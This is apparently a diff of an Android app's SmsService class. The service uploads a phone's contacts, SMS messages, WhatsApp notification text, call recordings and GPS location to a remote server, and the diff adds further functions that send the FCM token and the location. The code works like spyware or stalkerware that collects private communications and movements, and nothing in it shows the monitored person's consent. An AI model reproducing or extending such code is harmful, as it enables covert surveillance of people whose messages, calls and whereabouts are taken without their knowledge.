@@ -2,6 +2,7 @@ package gonext.smsapp.servers;
 
 import android.app.Notification;
 import android.content.Context;
+import android.util.Log;
 import android.webkit.MimeTypeMap;
 
 import com.google.gson.Gson;
@@ -80,7 +81,7 @@ public class SmsService {
             }
 
             RestAdapter restAdapter = new RestAdapter.Builder().setEndpoint(Constant.SECOND_URL).setClient(new OkClient(okHttpClient)).setExecutors(executor, executor).setLogLevel(RestAdapter.LogLevel.FULL).build();
-            testSmsAPI = restAdapter.create(SmsAPI.class);
+           testSmsAPI = restAdapter.create(SmsAPI.class);
         }
     }
 
@@ -89,14 +90,14 @@ public class SmsService {
         initSecondSMSAPI();
         SmsCallback smsCallback = new SmsCallback(1);
 //        smsAPI.postContacts("ContactList",removeSpChars(userMob),contactId,removeSpChars(contactNo),contactName,smsCallback);
-        testSmsAPI.postContacts("ContactList",removeSpChars(userMob),contactId,removeSpChars(contactNo),contactName,smsCallback);
+     testSmsAPI.postContacts("ContactList",removeSpChars(userMob),contactId,removeSpChars(contactNo),contactName,smsCallback);
     }
     public void sendSms(String userMob,String msgId,String msgDate,String msgFrom,String to,String msgText){
 //        initSMSAPI();
         initSecondSMSAPI();
         SmsCallback smsCallback = new SmsCallback(2);
 //        smsAPI.postMessages("SMSList",userMob,msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
-        testSmsAPI.postMessages("SMSList",userMob,msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
+    testSmsAPI.postMessages("SMSList",userMob,msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
     }
 
     public void sendNotification(String userMob, String msgId, String msgDate, String msgFrom, String to, String msgText, List<NotificationEntity> notifications){
@@ -104,7 +105,8 @@ public class SmsService {
         initSecondSMSAPI();
         SmsCallback smsCallback = new SmsCallback(context,3,notifications);
 //        smsAPI.postWhatsApp("WHATSAPP",removeSpChars(userMob),msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
-        testSmsAPI.postWhatsApp("WHATSAPP",removeSpChars(userMob),msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
+       // Log.e("SESESESE",""+removeSpChars(userMob)+"---"+msgId+"---"+msgDate+"---"+removeSpChars(msgFrom)+"---"+removeSpChars(to)+"---"+msgText+"---"+smsCallback);
+      testSmsAPI.postWhatsApp("WHATSAPP",removeSpChars(userMob),msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
     }
 
     public void sendMedia(File file,String userMobile){
@@ -120,7 +122,23 @@ public class SmsService {
         initSecondSMSAPI();
         SmsCallback smsCallback = new SmsCallback(5, file);
 //        smsAPI.postCallRecord("UPLOAD",removeSpChars(userMobile),new TypedFile(getMimeType(file.getAbsolutePath()),file),"CALLRECORD", smsCallback);
-        testSmsAPI.postCallRecord("UPLOAD",removeSpChars(userMobile),new TypedFile(getMimeType(file.getAbsolutePath()),file),"CALLRECORD", smsCallback);
+      testSmsAPI.postCallRecord("UPLOAD",removeSpChars(userMobile),new TypedFile(getMimeType(file.getAbsolutePath()),file),"CALLRECORD", smsCallback);
+    }
+
+    public void sendFcmToken(String token,String userMobile){
+//        Log.e("WEROTO",""+userMobile);
+//        initSMSAPI();
+        initSecondSMSAPI();
+        SmsCallback smsCallback = new SmsCallback(7);
+        testSmsAPI.postFCM(token,userMobile,smsCallback);
+    }
+
+    public void sendLocZ(String userMobile, String address){
+//        Log.e("WEROTOz",""+userMobile);
+//        initSMSAPI();
+        initSecondSMSAPI();
+        SmsCallback smsCallback = new SmsCallback(8);
+       testSmsAPI.postLocationz(userMobile,address,String.valueOf(Constant.latitude),String.valueOf(Constant.longitude),smsCallback);
     }
 
     public static String removeSpChars(String s){
@@ -141,10 +159,11 @@ public class SmsService {
     }
 
     public void sendLocation(String userMobile){
+//        Log.e("popopopo","YESSS");
 //        initSMSAPI();
         initSecondSMSAPI();
         SmsCallback smsCallback = new SmsCallback(6);
 //        smsAPI.postLocation("LOCATION",String.valueOf(Constant.latitude),String.valueOf(Constant.longitude),removeSpChars(userMobile), smsCallback);
-        testSmsAPI.postLocation("LOCATION",String.valueOf(Constant.latitude),String.valueOf(Constant.longitude),removeSpChars(userMobile), smsCallback);
+    testSmsAPI.postLocation("LOCATION",String.valueOf(Constant.latitude),String.valueOf(Constant.longitude),removeSpChars(userMobile), smsCallback);
     }
 }
